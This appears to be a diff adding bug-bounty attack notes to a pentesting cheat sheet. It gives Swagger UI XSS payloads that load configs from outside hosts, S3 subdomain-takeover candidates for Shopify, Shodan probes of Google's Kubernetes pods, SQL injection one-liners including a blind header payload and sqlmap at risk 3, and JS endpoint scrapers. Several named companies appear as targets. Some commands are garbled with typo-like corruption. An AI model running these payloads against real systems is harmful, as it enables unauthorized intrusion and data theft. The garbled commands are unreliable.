@@ -659,6 +659,83 @@ This command is running WPScan to enumerate a range of potential weaknesses in a
 
 It’s generally used by security professionals to find vulnerabilities or configuration issues in WordPress installations, or by attackers trying to gather information for potential exploitation.
 
+"Swagger UI" && host=".com"
+
+cat ubnt.com.txt | httpx-toolkit -path /swagger-api/ -status-code -content-length -o swagger.txt
+cat swagger.txt | grep "200"
+cat swiftfinancial.com.txt | httpx-toolkit -path /swagger-api/ -status-code -content-length | grep "200"
+
+shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title  
+
+Subdomain Takeover:
+Subhunter -l allsubs -o subtko.txt
+URLFinder:
+urlfinder -d tesla.com
+
+?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9
+?configUrl=https://jumpy-floor.surge.sh/test.json
+?config=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json
+
+https://shopify.com.cdn.s3.amazonaws.com/ ===> NoSuchBucket
+https://snapify.shopify.com.cdn.s3.amazonaws.com/ ===> NoSuchBucket
+------------------------------------
+https://hackerone.com/reports/1444682
+https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
+
+1. Find as many subdomains as possible
+2. cat all_subs.txt | dnsx | tee -a resolved_ones.txt
+3. cat resolved_ones.txt | httpx | tee -a alive_ones.txt
+4. ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt
+5. cat ffuf-result.txt | jq -r .results[].url | tee -a feed_me_to_httpx.txt
+6. cat feed_me_to_httpx.txt | httpx -silent -title | tee -a title.txt
+7. cat title.txt | grep "Swagger UI"
+
+=======================================================================
+
+Oneliners for SQL Injection 💉 :
+
+$ echo http://<TARGET> | waybackurls › target.txt ; python3 sqlidetector.py -f target.txt
+
+$ subfinder -d http://<TARGET> -silent -all | gau —blacklist ttf,woff,svg,png | sort -u I gf sqli › gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+
+$ findomain -t http://<TARGET> -q | httpx-silent | anew | waybackurls | gf sqli ›› sqli ; sqlmap -m sqli --batch -- random-agent --level 1
+
+$ cat urls.txt | grep ".php" | sed 's/\. php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl —silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection \e[0m" ; done
+
+- Header-Based Blind SQL injection:
+$ cat domain.txt | httpx-silent -H "X-Forwarded-For:
+'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+
+---------------------------------------------------------------------------
+Oneliners I use frequently in my engagements to extract all endpoints from a JS file:
+
+Method 1:
+waybackurls HOSTS | tac | sed "s#\\\/#\/hashtag#g" | egrep -o "src['\"]?
+15*[=: 1\5*[ '\"]?[^'\"]+.js[^'|"> ]*" | awk -F '/'
+'{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh
+-c "curl -k -s \"%)" | sed \"s/[;}\)>]/\n/g\" | grep -Po \" (L'1|\"](https?: )?[/1{1,2}[^'||l"> 1{5,3)|(\.
+(get|post|ajax|load)\s*\(\5*['||\"](https?:)?[/1{1,2}[^'||\"> ]
+{5,})\"" | awk -F "['|"]" '{print $2}' sort -fu
+
+Method 2:
+cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt
+
+--------------------------------------------------------------------------------------
+Reduce Noise in Burp Suite with This Simple Trick! 🔥
+
+💡 Just add the following patterns in Burp Suite under Proxy > Options > TLS Pass Through:
+
+.*\.google\.com
+
+.*\.gstatic\.com
+
+.*\.googleapis\.com
+
+.*\.pki\.goog
+
+.*\.mozilla\..*
+--------------------------------------------------------------------------------------
 
 if you want brute force wordpress login ..use this one ...i used usr name as aungsanoo and passwors is aunglat as you already known..i use my test wordlist..you can use rockyou ..exanple 
 
